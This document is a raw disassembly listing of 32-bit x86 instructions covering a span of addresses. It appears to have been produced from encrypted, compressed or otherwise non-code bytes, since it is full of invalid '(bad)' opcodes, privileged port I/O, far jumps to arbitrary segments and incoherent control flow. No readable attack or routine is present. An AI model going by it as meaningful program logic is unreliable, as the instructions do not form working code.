  420e2a:	call   eax
  420e2c:	cs cmp edi,esi
  420e2f:	mov    cl,0x94
  420e31:	fmul   QWORD PTR [ebp-0x1d]
  420e34:	sub    DWORD PTR [esi],0x7010733d
  420e3a:	mov    ecx,0x323a0ca9
  420e3f:	xor    eax,0xd82fd814
  420e44:	outs   dx,BYTE PTR ds:[esi]
  420e45:	xor    BYTE PTR [eax+esi*8-0x7b],bl
  420e49:	ret    
  420e4a:	repz dec eax
  420e4c:	(bad)  
  420e4d:	loop   0x420e44
  420e4f:	dec    ebx
  420e50:	cmp    BYTE PTR [edi],al
  420e52:	push   esp
  420e53:	ret    0xf440
  420e56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e57:	sub    BYTE PTR [esi+0x4fad1be5],ah
  420e5d:	sub    BYTE PTR [eax+0x6],al
  420e60:	es cs in eax,dx
  420e63:	aad    0x94
  420e65:	mov    esi,fs
  420e67:	push   esp
  420e68:	pop    esp
  420e69:	js     0x420ea9
  420e6b:	fs pop eax
  420e6d:	xor    ebp,ebp
  420e6f:	leave  
  420e70:	pop    es
  420e71:	or     bl,BYTE PTR [edx-0x45948aaa]
  420e77:	scas   eax,DWORD PTR es:[edi]
  420e78:	(bad)  [edx-0x4f41205a]
  420e7e:	shr    DWORD PTR [esi],cl
  420e80:	jmp    0x420e5d
  420e82:	add    bl,dl
  420e84:	retf   0x6a73
  420e87:	lahf   
  420e88:	mov    ch,0xf1
  420e8a:	add    eax,0x9fa3d7fe
  420e8f:	jne    0x420e75
  420e91:	jo     0x420f0a
  420e93:	sbb    bl,bh
  420e95:	sub    al,BYTE PTR [edx+0x59]
  420e98:	hlt    
  420e99:	hlt    
  420e9a:	ins    DWORD PTR es:[edi],dx
  420e9b:	lock xchg DWORD PTR [ebp-0x4b],edx
  420e9f:	scas   eax,DWORD PTR es:[edi]
  420ea0:	xor    al,0xf2
  420ea2:	jle    0x420e42
  420ea4:	popa   
  420ea5:	jp     0x420eab
  420ea7:	scas   al,BYTE PTR es:[edi]
  420ea8:	outs   dx,DWORD PTR ds:[esi]
  420ea9:	mov    ebx,0xafad1c00
  420eae:	xchg   BYTE PTR [eax+0x6e],cl
  420eb1:	test   al,0x5
  420eb3:	mov    edx,0x81caae76
  420eb8:	out    dx,eax
  420eb9:	cmp    ah,bl
  420ebb:	aad    0xe9
  420ebd:	dec    esi
  420ebe:	sbb    DWORD PTR [esi],ebp
  420ec0:	sti    
  420ec1:	test   al,0x21
  420ec3:	and    eax,0xeaae7416
  420ec8:	xchg   ebx,eax
  420ec9:	push   ebp
  420eca:	in     al,dx
  420ecb:	push   eax
  420ecc:	out    0xdf,al
  420ece:	sti    
  420ecf:	fild   DWORD PTR [ecx-0x40d742b3]
  420ed5:	clc    
  420ed6:	xchg   ecx,eax
  420ed7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ed8:	je     0x420f33
  420eda:	jae    0x420efd
  420edc:	cdq    
  420edd:	lock hlt 
  420edf:	jle    0x420ea4
  420ee1:	inc    ebp
  420ee2:	int3   
  420ee3:	pop    ecx
  420ee4:	dec    ebp
  420ee5:	inc    esp
  420ee6:	dec    esi
  420ee7:	cmp    BYTE PTR [edi],dh
  420ee9:	jmp    0xe5003ef9
  420eee:	and    ecx,edi
  420ef0:	xlat   BYTE PTR ds:[ebx]
  420ef1:	cmp    eax,0xa7d97afc
  420ef6:	test   al,0xc6
  420ef8:	dec    eax
  420ef9:	daa    
  420efa:	or     DWORD PTR [ebx+0x4444733e],esi
  420f00:	aas    
  420f01:	clc    
  420f02:	(bad)  
  420f04:	pop    esi
  420f05:	push   ds
  420f06:	push   es
  420f07:	shl    DWORD PTR es:[edi-0x4a],0x7
  420f0c:	hlt    
  420f0d:	pop    ecx
  420f0e:	ss jns 0x420f11
	...
  420f71:	add    BYTE PTR [eax],al
  420f73:	add    BYTE PTR [eax],ah
  420f75:	xchg   edi,eax
  420f76:	inc    edx
  420f77:	shl    edi,cl
  420f79:	xlat   BYTE PTR ds:[ebx]
  420f7a:	mov    cl,0xf7
  420f7c:	jg     0x420f6b
  420f7e:	or     esp,DWORD PTR [esi-0x69c67284]
  420f84:	or     BYTE PTR [edi+0x1],bl
  420f87:	add    BYTE PTR [ecx+eax*1],al
  420f8a:	add    BYTE PTR [eax],al
  420f8c:	gs push edx
  420f8e:	jecxz  0x420f4c
  420f90:	js     0x420f29
  420f92:	xchg   esi,eax
  420f93:	dec    eax
  420f94:	pop    esi
  420f95:	or     ebp,DWORD PTR [eax-0x79]
  420f98:	xor    ecx,edx
  420f9a:	in     al,0x79
  420f9c:	lods   al,BYTE PTR ds:[esi]
  420f9d:	mov    WORD PTR [edi-0x2943be4f],gs
  420fa3:	ds xchg edx,eax
  420fa5:	fistp  WORD PTR [edi-0x45]
  420fa8:	xchg   esi,eax
  420fa9:	xor    ebx,eax
  420fab:	loop   0x42100a
  420fad:	lods   eax,DWORD PTR ds:[esi]
  420fae:	inc    edx
  420faf:	test   DWORD PTR [edi-0x6bd63609],eax
  420fb5:	add    eax,0x82970374
  420fba:	idiv   DWORD PTR [ebx+esi*2+0x27]
  420fbe:	pop    es
  420fbf:	jne    0x42101d
  420fc1:	mov    edi,0xfff72aa8
  420fc6:	leave  
  420fc7:	mov    esp,esi
  420fc9:	ins    BYTE PTR es:[edi],dx
  420fca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420fcb:	imul   esi,DWORD PTR [ebp+0x37],0x23
  420fcf:	(bad)  
  420fd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420fd1:	sub    al,0x20
  420fd3:	push   ecx
  420fd4:	pusha  
  420fd5:	in     al,dx
  420fd6:	inc    edx
  420fd7:	mov    ebx,0xd269b213
  420fdc:	push   ebx
  420fdd:	cmp    al,BYTE PTR [esi+0x7a2d1a58]
  420fe3:	cwde   
  420fe4:	pop    edx
  420fe5:	sub    edx,DWORD PTR [edi+0x235e29a5]
  420feb:	mov    ds:0x48ef6751,al
  420ff0:	mov    al,0x1e
  420ff2:	std    
  420ff3:	std    
  420ff4:	jle    0x42103c
  420ff6:	xchg   BYTE PTR [edi-0x4c0d1976],dh
  420ffc:	add    BYTE PTR [eax-0x6b],al
  420fff:	and    al,0x84
  421001:	inc    edi
  421002:	rol    edi,0xa8
  421005:	cmp    al,0x5a
  421007:	ret    0x4529
  42100a:	sbb    BYTE PTR [ecx],dl
  42100c:	test   BYTE PTR [edx-0x155279a7],bh
  421012:	mov    al,ds:0x1f267927
  421017:	xor    eax,0x16998238
  42101c:	mov    eax,0x2ce93653
  421021:	jno    0x421088
  421023:	pop    ecx
  421024:	adc    DWORD PTR [ebx-0x4f],0x6da17501
  42102b:	test   DWORD PTR [edx-0x3ba983a6],0x3b46e01c
  421035:	add    bl,BYTE PTR [edi-0x5a]
  421038:	push   0x10
  42103a:	jne    0x42106c
  42103c:	adc    al,0x4a
  42103e:	pop    esi
  42103f:	mov    al,0xbe
  421041:	inc    esp
  421042:	mov    cs,WORD PTR [ebx]
  421044:	in     eax,0x8d
  421046:	cmp    al,0x31
  421048:	sbb    edx,DWORD PTR [ecx]
  42104a:	and    eax,0x6bcb4184
  42104f:	add    cl,BYTE PTR [esi]
  421051:	call   FWORD PTR [edx-0x75]
  421054:	test   ecx,edx
  421056:	mov    ah,0xa0
  421058:	fld    DWORD PTR [ecx+0x3e503335]
  42105e:	inc    esi
  42105f:	test   al,0x2d
  421061:	xor    eax,0xc76f0f6
  421066:	cmp    eax,0xfaa507c8
  42106b:	ret    0x210d
  42106e:	fwait
  42106f:	mov    edx,0x955f2740
  421074:	xchg   edi,eax
  421075:	scas   eax,DWORD PTR es:[edi]
  421076:	push   edi
  421077:	fmul   DWORD PTR [edx+0x4aadfd4a]
  42107d:	out    0x53,al
  42107f:	adc    DWORD PTR [ecx+0x75fdabfe],ebx
  421085:	jg     0x4210d5
  421087:	mov    esi,0x4bc414ab
  42108c:	gs mov edi,0x7127
	...
  4210f2:	add    BYTE PTR [eax],al
  4210f4:	lahf   
  4210f5:	pop    esi
  4210f6:	fcmovb st,st(6)
  4210f8:	fcmovnb st,st(6)
  4210fa:	lahf   
  4210fb:	pop    edi
  4210fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210fd:	jne    0x4210e1
  4210ff:	mov    ss,WORD PTR [ebp+0xc92c676]
  421105:	pusha  
  421106:	add    DWORD PTR [eax],eax
  421108:	add    al,0x1
  42110a:	add    BYTE PTR [eax],al
  42110c:	mov    ch,0x30
  42110e:	or     dl,dh
  421110:	jno    0x421129
  421112:	inc    ecx
  421113:	push   esp
  421114:	mov    dh,0x9
  421116:	ja     0x4210aa
  421118:	cdq    
  421119:	cdq    
  42111a:	xchg   ebp,eax
  42111b:	adc    BYTE PTR [edi-0x35],0x4
  42111f:	es inc esp
  421121:	push   0x1a4402af
  421126:	in     eax,0xb6
  421128:	clc    
  421129:	(bad)  
  42112a:	call   0x85d7e0f4
  42112f:	sbb    al,0x6e
  421131:	pusha  
  421132:	stos   DWORD PTR es:[edi],eax
  421133:	ins    DWORD PTR es:[edi],dx
  421134:	loop   0x421126
  421136:	push   edi
  421137:	in     al,dx
  421138:	add    al,0x1f
  42113b:	jl     0x4210cb
  42113d:	stos   DWORD PTR es:[edi],eax
  42113e:	imul   ebp,DWORD PTR [ebp+0x7a7794f2],0x6a
  421145:	mov    eax,ds:0xbfc1c209
  42114a:	pushf  
  42114b:	rol    DWORD PTR [edi-0x11],1
  42114e:	mov    eax,fs:0x5529c536
  421154:	dec    ebp
  421155:	add    eax,0xb710c402
  42115a:	loope  0x4211bf
  42115c:	add    eax,0x5e2bc770
  421161:	push   ebp
  421162:	bound  edi,QWORD PTR [ebx]
  421164:	leave  
  421165:	in     al,0x37
  421167:	push   ebx
  421168:	add    eax,0x684cfe31
  42116d:	aam    0xee
  42116f:	ret    0x87d5
  421172:	mov    ebp,0xc31f9d57
  421177:	jle    0x421199
  421179:	mov    bl,0x47
  42117b:	add    eax,0xa1f5e077
  421180:	(bad)  [edi+0x36a300a2]
  421186:	jmp    0x42117a
  421188:	xor    eax,0x66cc6d6a
  42118d:	xchg   ebp,eax
  42118e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42118f:	dec    edi
  421190:	fwait
  421191:	(bad)  
  421192:	sub    al,0x9e
  421194:	jge    0x421192
  421196:	fmul   QWORD PTR [ebx+0x2c]
  421199:	mov    eax,ds:0x8e76210f
  42119e:	pop    ss
  42119f:	out    dx,eax
  4211a0:	xchg   esi,eax
  4211a1:	pop    edx
  4211a2:	in     eax,dx
  4211a3:	in     eax,dx
  4211a4:	ror    BYTE PTR [eax-0x3fe3efc7],cl
  4211aa:	lods   al,BYTE PTR ds:[esi]
  4211ab:	pop    ss
  4211ac:	mov    ecx,DWORD PTR [ebp-0x55299cd0]
  4211b2:	dec    ebx
  4211b3:	adc    eax,0x4360fbcb
  4211b8:	test   al,0xef
  4211ba:	(bad)
  4211be:	adc    al,BYTE PTR [edi+ecx*4-0x2d]
  4211c2:	fnsave [ecx+0x33]
  4211c5:	add    al,0xba
  4211c7:	pop    ecx
  4211c8:	mov    eax,0xcc371ad7
  4211cd:	cld    
  4211ce:	icebp  
  4211cf:	pusha  
  4211d0:	and    BYTE PTR [edx-0x68],ah
  4211d3:	sti    
  4211d4:	or     DWORD PTR ds:0xe21803da,ebp
  4211da:	xor    DWORD PTR es:[ecx],eax
  4211dd:	call   0x3bfd:0xc6b2070f
  4211e4:	int3   
  4211e5:	and    DWORD PTR ds:0x96719bc1,eax
  4211eb:	and    DWORD PTR [esi],eax
  4211ed:	ds cdq 
  4211ef:	sbb    al,0x70
  4211f1:	mov    al,BYTE PTR [esi]
  4211f3:	cmc    
  4211f4:	popa   
  4211f5:	into   
  4211f6:	(bad)  
  4211f7:	push   eax
  4211f8:	pop    ebp
  4211f9:	inc    ebx
  4211fa:	cmp    cl,BYTE PTR [ebp+0x49]
  4211fd:	cmp    DWORD PTR [ebp-0x64977ec8],edx
  421203:	jge    0x421259
  421205:	pop    ecx
  421206:	les    edx,FWORD PTR [esi+0x70]
  421209:	xor    al,0x3
  42120b:	pop    ebx
  42120c:	jecxz  0x4211a8
  42120e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42120f:	mov    ecx,0x0
	...
  421274:	sahf   
  421275:	pop    ds
  421276:	(bad)  
  421277:	test   DWORD PTR [edi-0x42800109],0xa47ab32d
  421281:	dec    esi
  421282:	inc    edx
  421283:	pusha  
  421284:	adc    BYTE PTR [ecx+0x1],ah
  421287:	add    BYTE PTR [ecx+eax*1],al
  42128a:	add    BYTE PTR [eax],al
  42128c:	pop    edi
  42128d:	scas   eax,DWORD PTR es:[edi]
  42128e:	adc    eax,0x23b7cb83
  421293:	mov    edi,0x6eda2f1f
  421298:	(bad)  
  421299:	cld    
  42129a:	ret    
  42129b:	fdivr  st,st(4)
  42129d:	outs   dx,DWORD PTR ds:[esi]
  42129e:	push   esp
  42129f:	sbb    al,0x90
  4212a1:	ja     0x4212a7
  4212a3:	xchg   ebp,eax
  4212a4:	push   ecx
  4212a5:	shl    DWORD PTR [edx+0x741e1bd],cl
  4212ab:	xlat   BYTE PTR ds:[ebx]
  4212ac:	out    dx,eax
  4212ad:	fld    st(4)
  4212af:	sbb    eax,0xe2917d77
  4212b4:	jl     0x421260
  4212b6:	cmp    BYTE PTR [edi-0x26],al
  4212b9:	sub    BYTE PTR [esi],bh
  4212bb:	jl     0x421294
  4212bd:	jl     0x421327
  4212bf:	repz mov ch,0xa2
  4212c2:	mov    eax,0xb7ac902e
  4212c7:	cli    
  4212c8:	cmp    al,al
  4212ca:	(bad)  
  4212cb:	cs test al,0xd2
  4212ce:	pop    ds
  4212cf:	in     eax,dx
  4212d0:	push   esp
  4212d1:	and    eax,0x2deae228
  4212d6:	mov    al,bl
  4212d8:	jns    0x4212e0
  4212da:	add    eax,0x1f6d9179
  4212df:	in     eax,0x33
  4212e1:	jb     0x4212f1
  4212e3:	xor    al,0x6b
  4212e5:	cmp    ebp,ebp
  4212e7:	scas   eax,DWORD PTR es:[edi]
  4212e8:	jmp    0x7f63:0xd5178003
  4212ef:	call   0x4e53:0x4cae6114
  4212f6:	dec    ebp
  4212f7:	mov    esp,0x3eb0d219
  4212fc:	xchg   edx,eax
  4212fd:	xchg   DWORD PTR [edx+0x3],ecx
  421300:	jns    0x421300
  421302:	aad    0x35
  421304:	inc    eax
  421305:	loopne 0x421306
  421307:	sahf   
  421308:	addr16 stc 
  42130a:	sahf   
  42130b:	dec    esp
  42130c:	or     eax,0xac37fc54
  421311:	call   0xd592:0x87b5f864
  421318:	(bad)  
  421319:	popa   
  42131a:	sub    edi,DWORD PTR [edx+edi*2+0x4c62d8a]
  421321:	mul    cl
  421323:	test   bh,bh
  421325:	dec    ebp
  421326:	adc    eax,0x231af289
  42132b:	adc    ah,BYTE PTR [edx+edx*8+0x25]
  42132f:	cmp    al,0xc5
  421331:	std    
  421332:	push   edx
  421333:	cmc    
  421334:	mov    BYTE PTR [ecx],0x3d
  421337:	idiv   DWORD PTR [eax-0x61]
  42133a:	jnp    0x4212f7
  42133c:	sbb    al,0x73
  42133e:	push   eax
  42133f:	xchg   edi,eax
  421340:	xchg   edx,eax
  421341:	pop    ebx
  421342:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421343:	push   ebx
  421344:	mov    WORD PTR [eax-0x68c7d11e],es
  42134a:	sub    eax,0xf370284b
  42134f:	lahf   
  421350:	test   dl,ah
  421352:	inc    ebp
  421353:	pop    eax
  421354:	(bad)  
  421355:	stc    
  421356:	ret    0x4eaf
  421359:	jle    0x42134a
  42135b:	pop    ebx
  42135c:	push   0x6e0c7fa4
  421361:	xchg   edi,eax
  421362:	dec    eax
  421363:	lahf   
  421364:	aad    0xe2
  421366:	pop    eax
  421367:	out    dx,eax
  421368:	leave  
  421369:	shl    DWORD PTR [ecx],0xfa
  42136c:	mov    esp,0x52749794
  421371:	mov    ecx,0xe84d4d6b
  421376:	mov    WORD PTR [edx-0x247ba38f],ds
  42137c:	mov    eax,ds:0x4410aba9
  421381:	cmp    ah,BYTE PTR [esi-0x4a298419]
  421387:	pop    ds
  421388:	das    
  421389:	cmp    eax,DWORD PTR [esp+eax*4-0x577254a5]
	...
  4213f4:	inc    bh
  4213f6:	pop    esp
  4213f7:	mov    eax,ds:0xdfffbb7d
  4213fc:	fstp   DWORD PTR [ebp+0x5615f49f]
  421402:	stos   BYTE PTR es:[edi],al
  421403:	iret   
  421404:	adc    al,0x62
  421406:	add    DWORD PTR [eax],eax
  421408:	add    al,0x1
  42140a:	add    BYTE PTR [eax],al
  42140c:	pop    ds
  42140d:	(bad)  
  42140e:	push   edi
  42140f:	inc    ebx
  421410:	leave  
  421411:	jbe    0x421490
  421413:	or     eax,0x5b4ba78c
  421418:	test   eax,0x1d5a88c4
  42141d:	(bad)  
  42141e:	clc    
  42141f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421420:	mov    cl,0x49
  421422:	int3   
  421423:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421424:	push   esp
  421425:	xchg   DWORD PTR [ebp-0x3a3fc77e],ecx
  42142b:	imul   ecx,esi,0x51
  42142e:	(bad)  
  421430:	jge    0x4213da
  421432:	pop    edi
  421433:	ja     0x42146c
  421435:	mov    BYTE PTR [edi],dh
  421437:	ret    0x50aa
  42143a:	data16 fst QWORD PTR [ebx]
  42143d:	test   eax,0x25b1f1c4
  421442:	or     eax,ecx
  421444:	jns    0x421469
  421446:	enter  0x218,0xa
  42144a:	xor    BYTE PTR [edi+ecx*8-0x3f],0x79
  42144f:	cmp    DWORD PTR [edx+0x86a46a7],ecx
  421455:	inc    esi
  421456:	dec    edi
  421457:	out    0x73,eax
  421459:	mov    bh,0xc4
  42145b:	sub    al,0x61
  42145d:	aad    0x79
  42145f:	fwait
  421460:	dec    edx
  421461:	ins    BYTE PTR es:[edi],dx
  421462:	inc    edx
  421463:	jg     0x42147a
  421465:	jge    0x42145e
  421467:	outs   dx,BYTE PTR ds:[esi]
  421468:	sbb    eax,0x30ae3bab
  42146d:	mov    eax,ds:0xbb19674d
  421472:	xchg   edi,eax
  421473:	pop    ebx
  421474:	push   cs
  421475:	int3   
  421476:	dec    eax
  421477:	sbb    al,0x40
  421479:	mov    ds:0xf9e6b65c,eax
  42147e:	adc    al,0x9
  421480:	add    BYTE PTR [ebp+0x7b],ah
  421483:	mov    ebp,0x28ed85a1
  421488:	test   DWORD PTR [ecx-0x1e],ebp
  42148b:	xchg   esp,eax
  42148c:	xchg   esi,eax
  42148d:	adc    al,0x4
  42148f:	and    al,0x4b
  421491:	xor    BYTE PTR [edi+0x688cef19],ch
  421497:	fidiv  WORD PTR [esi]
  421499:	adc    al,0x2c
  42149b:	adc    edi,edi
  42149d:	addr16 cwde 
  42149f:	pop    edx
  4214a0:	sub    esi,DWORD PTR [eax]
  4214a2:	pop    ss
  4214a3:	push   ebx
  4214a4:	pop    DWORD PTR [esi]
  4214a6:	xchg   BYTE PTR [eax+edi*8-0x629b9f6f],dl
  4214ad:	popf   
  4214ae:	or     eax,0x93ed1470
  4214b3:	data16 loope 0x4214b4
  4214b6:	adc    al,0x7f
  4214b8:	pusha  
  4214b9:	in     al,dx
  4214ba:	xchg   edx,ebp
  4214bc:	jmp    0x4b06:0xef8867f6
  4214c3:	jnp    0x4214b3
  4214c5:	push   edx
  4214c6:	stos   BYTE PTR es:[edi],al
  4214c7:	pop    eax
  4214c8:	push   edx
  4214c9:	mov    dh,0xbd
  4214cb:	adc    DWORD PTR es:[ecx-0x5465d451],ebx
  4214d2:	push   es
  4214d3:	sbb    eax,0xa513ecf8
  4214d8:	mov    WORD PTR [esp+ebx*8],?
  4214db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4214dc:	pop    ss
  4214dd:	push   eax
  4214de:	lea    esp,[eax+0x4f5b5096]
  4214e4:	test   al,0x22
  4214e6:	in     al,dx
  4214e7:	imul   esp,edi,0x1eca4994
  4214ed:	or     esp,edi
  4214ef:	cwde   
  4214f0:	jge    0x4214cf
  4214f2:	mov    ch,BYTE PTR [esi]
  4214f4:	inc    ecx
  4214f5:	aad    0xb8
  4214f7:	push   cs
  4214f8:	xchg   ecx,eax
  4214f9:	pop    edx
  4214fa:	dec    edi
  4214fb:	rcr    DWORD PTR [ebx],0x68
  4214fe:	mov    ah,dh
  421500:	shl    BYTE PTR [ebp+0x7fef395c],0xf4
  421507:	xor    edx,DWORD PTR [edi-0x61c05b9f]
  42150d:	and    bl,cl
  42150f:	inc    esi
	...
  421574:	(bad)  
  421575:	repnz test BYTE PTR [eax],bl
  421578:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421579:	jle    0x421559
  42157b:	(bad)  
  42157c:	arpl   WORD PTR [eax+0x4a3042b4],bp
  421582:	add    eax,0x1631887
  421587:	add    BYTE PTR [ecx+eax*1],al
  42158a:	add    BYTE PTR [eax],al
  42158c:	es out dx,al
  42158e:	push   ds
  42158f:	mov    ebx,0xb38a19b9
  421594:	push   ebx
  421595:	xchg   BYTE PTR [ecx-0x68],dh
  421598:	leave  
  421599:	pop    eax
  42159a:	cmp    esp,DWORD PTR [edx+0x3567c941]
  4215a0:	mov    bh,0x95
  4215a2:	and    al,0x80
  4215a4:	sbb    al,0xc8
  4215a6:	dec    esi
  4215a7:	mov    ch,0xf0
  4215a9:	sbb    ebp,ecx
  4215ab:	fs push 0x6d
  4215ae:	imul   edi,DWORD PTR [eax+0x5e],0x47
  4215b2:	cs pop esi
  4215b4:	fs mov dl,0x78
  4215b7:	ins    DWORD PTR es:[edi],dx
  4215b8:	pop    ebx
  4215b9:	jg     0x4215b9
  4215bb:	xchg   edx,eax
  4215bc:	fild   QWORD PTR [eax-0x47]
  4215bf:	aaa    
  4215c0:	loope  0x42163c
  4215c2:	sti    
  4215c3:	lods   eax,DWORD PTR ds:[esi]
  4215c4:	or     cl,dl
  4215c6:	out    0xf9,eax
  4215c8:	mov    ds:0x475c1f8,eax
  4215cd:	mov    ds:0xbbe22ac2,al
  4215d2:	imul   esp,DWORD PTR [esi+0xf],0x105951da
  4215d9:	scas   al,BYTE PTR es:[edi]
  4215da:	fidiv  DWORD PTR ds:0xd4818e66
  4215e0:	std    
  4215e1:	mov    ds:0x45ce9dd4,eax
  4215e6:	std    
  4215e7:	(bad)  
  4215e8:	call   0xb51c:0x3826845c
  4215ef:	jmp    0x42159b
  4215f1:	aad    0x88
  4215f3:	scas   al,BYTE PTR es:[edi]
  4215f4:	pushf  
  4215f5:	mov    cl,0xbc
  4215f7:	sub    ch,BYTE PTR [edx+0x3bb4d37d]
  4215fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4215fe:	stc    
  4215ff:	mov    ebp,0x29f1c177
  421604:	cmp    bh,BYTE PTR [ebx+eax*1-0x4f349ec1]
  42160b:	in     al,dx
  42160c:	ins    BYTE PTR es:[edi],dx
  42160d:	ret    
  42160e:	outs   dx,BYTE PTR ds:[esi]
  42160f:	int3   
  421610:	mov    cl,0x87
  421612:	adc    BYTE PTR [ecx],ah
  421614:	mov    ah,ah
  421616:	pop    es
  421617:	popa   
  421618:	outs   dx,DWORD PTR ds:[esi]
  421619:	mov    ds:0xb5b13832,al
  42161e:	mov    al,dl
  421620:	adc    BYTE PTR [edi],dh
  421622:	jg     0x4215ff
  421624:	ficomp DWORD PTR [ecx-0x1c814432]
  42162a:	ret    
  42162b:	mov    ecx,0x2bbbde1e
  421630:	xor    BYTE PTR [esi+0x7],0x8b
  421634:	mov    ebx,0x7f09ac71
  421639:	ror    eax,0x33
  42163c:	call   0x38c5:0x62fb3a8e
  421643:	aam    0x2c
  421645:	pop    es
  421646:	adc    esi,DWORD PTR [ebx+0x30bbb547]
  42164c:	bound  esi,QWORD PTR [ebx+0x5b355763]
  421652:	pop    ds
  421653:	xchg   BYTE PTR [ebx-0x47],ch
  421656:	push   esi
  421657:	mov    ebp,0xd51ab621
  42165c:	push   cs
  42165d:	imul   ch
  42165f:	pusha  
  421660:	mov    DWORD PTR [eax+0x388f4ca0],ebx
  421666:	mov    cl,0x7d
  421668:	sbb    al,0xe1
  42166a:	jmp    0xf62a:0x2494cb35
  421671:	sbb    eax,0xbdc00bd3
  421676:	inc    edx
  421677:	mov    esi,0x80ca070c
  42167c:	or     DWORD PTR [ecx+0x6dbce644],0xd
  421683:	aas    
  421684:	xor    cl,bl
  421686:	fisttp QWORD PTR [edx]
  421688:	aas    
  421689:	ret    0x869a
  42168c:	lea    edx,[ecx]
  42168e:	pop    esp
  42168f:	push   es
	...
  4216f4:	stos   DWORD PTR es:[edi],eax
  4216f5:	sub    al,0xed
  4216f7:	stos   BYTE PTR es:[edi],al
  4216f8:	out    dx,eax
  4216f9:	jmp    0x4216ea
  4216fb:	sub    eax,0xa3418669
  421700:	das    
  421701:	into   
  421702:	stc    
  421703:	loope  0x421721
  421705:	add    DWORD PTR fs:[eax],eax
  421708:	add    al,0x1
  42170a:	add    BYTE PTR [eax],al
  42170c:	(bad)
  421711:	jmp    DWORD PTR [eax]
  421713:	ds push 0x12db97d6
  421719:	inc    esi
  42171a:	lods   al,BYTE PTR ds:[esi]
  42171b:	sti    
  42171c:	mov    ebx,0x9b0cbbe
  421721:	xchg   esp,eax
  421722:	aas    
  421723:	rcl    BYTE PTR [edx+0x79],cl
  421726:	int3   
  421727:	(bad)  
  421728:	lock test BYTE PTR [eax],ch
  42172b:	xor    DWORD PTR [edi+0x6cf73bb8],ebp
  421731:	aas    
  421732:	cmp    DWORD PTR [edx+0x7369365a],edi
  421738:	sub    al,0x84
  42173a:	lds    edx,FWORD PTR es:[edx]
  42173d:	or     al,ch
  42173f:	out    dx,al
  421740:	jecxz  0x42178c
  421742:	retf   0x8d4e
  421745:	xchg   ebp,eax
  421746:	lahf   
  421747:	mov    esi,gs
  421749:	inc    edx
  42174a:	push   cs
  42174b:	cmp    bh,ch
  42174d:	cmc    
  42174e:	outs   dx,DWORD PTR ds:[esi]
  42174f:	mov    bl,0x82
  421751:	je     0x4217c4
  421753:	sub    ebp,eax
  421755:	loopne 0x4217b1
  421757:	imul   edi,DWORD PTR [ebp-0x173edb7],0x67
  42175e:	aad    0x8
  421760:	iret   
  421761:	les    eax,FWORD PTR [ecx+edi*4]
  421764:	fisttp QWORD PTR [eax-0x4a]
  421767:	(bad)
  42176a:	add    ch,cl
  42176c:	fcom   DWORD PTR [ebp+0xd]
  42176f:	push   ebp
  421770:	dec    esi
  421771:	jmp    0xa431:0x38f4ff0d
  421778:	or     BYTE PTR [edx+edi*2+0x2db64b1f],al
  42177f:	mov    edi,0xf97e261
  421784:	and    dh,BYTE PTR [edx-0x2a]
  421787:	xor    DWORD PTR [esi+ebx*2-0x71f0d5f],edx
  42178e:	loopne 0x42177a
  421790:	clc    
  421791:	cmp    al,0x25
  421793:	repnz mov fs,WORD PTR [edi+0x50]
  421797:	xor    esi,eax
  421799:	sub    BYTE PTR [edi+0x6996ca01],dl
  42179f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4217a0:	lds    edx,FWORD PTR [eax]
  4217a2:	and    eax,DWORD PTR [ebx-0x21e32b01]
  4217a8:	xchg   ebx,eax
  4217a9:	cmp    al,0x8b
  4217ab:	aaa    
  4217ac:	cmp    bh,dl
  4217ae:	hlt    
  4217af:	jb     0x421823
  4217b1:	mov    ebp,?
  4217b3:	mov    ecx,0x8f8349fd
  4217b8:	pop    esp
  4217b9:	push   0xffffffe6
  4217bb:	popf   
  4217bc:	dec    eax
  4217bd:	mov    esp,0xcad9309b
  4217c2:	pop    esi
  4217c3:	or     DWORD PTR [eax],0xfd3a5bf1
  4217c9:	ret    
  4217ca:	sbb    BYTE PTR [ebx+0x338cbcbe],0xbf
  4217d1:	add    BYTE PTR ds:0x71bc4d35,dl
  4217d7:	push   es
  4217d8:	or     al,0xfa
  4217da:	mov    eax,0xbe70444c
  4217df:	out    dx,eax
  4217e0:	mov    ecx,0xca3f9d56
  4217e5:	jnp    0x4217d5
  4217e7:	fsub   QWORD PTR [eax-0x7]
  4217ea:	fs mov eax,0x7e70834a
  4217f0:	mov    ch,BYTE PTR [edx+ebx*1+0x2f051e72]
  4217f7:	in     eax,0x57
  4217f9:	mov    cs:0x37ea554b,eax
  4217ff:	scas   al,BYTE PTR es:[edi]
  421800:	mov    ecx,0x62290dc
  421806:	add    eax,0x66d3de69
  42180b:	mov    ch,0x3f
  42180d:	mov    edi,0x458b
	...
  421872:	add    BYTE PTR [eax],al
  421874:	shl    DWORD PTR [eax-0x6061f47],1
  42187a:	fnstenv [ecx-0x359a0174]
  421880:	lock aaa 
  421882:	imul   ebp,DWORD PTR [ebx],0x20
  421885:	add    DWORD PTR gs:[eax],eax
  421888:	add    al,0x1
  42188a:	add    BYTE PTR [eax],al
  42188c:	inc    edi
  42188d:	ja     0x421811
  42188f:	imul   esi,DWORD PTR [esi+ebp*1-0x41],0x51
  421894:	hlt    
  421895:	rcr    DWORD PTR [ebp+eiz*8+0xa53127c],1
  42189c:	in     al,0x57
  42189e:	ret    
  42189f:	or     al,0xa9
  4218a1:	nop
  4218a2:	sub    BYTE PTR [eax+0x36],0x50
  4218a6:	add    eax,0x1ad724bc
  4218ab:	fild   DWORD PTR ds:0xfa0c59d6
  4218b1:	dec    esi
  4218b2:	mov    ds:0x575ddb65,eax
  4218b7:	jns    0x42188e
  4218b9:	es mov ecx,0x96daa98e
  4218bf:	shl    ecx,1
  4218c1:	scas   al,BYTE PTR es:[edi]
  4218c2:	sub    ebp,0x722f32f3
  4218c8:	or     dl,bh
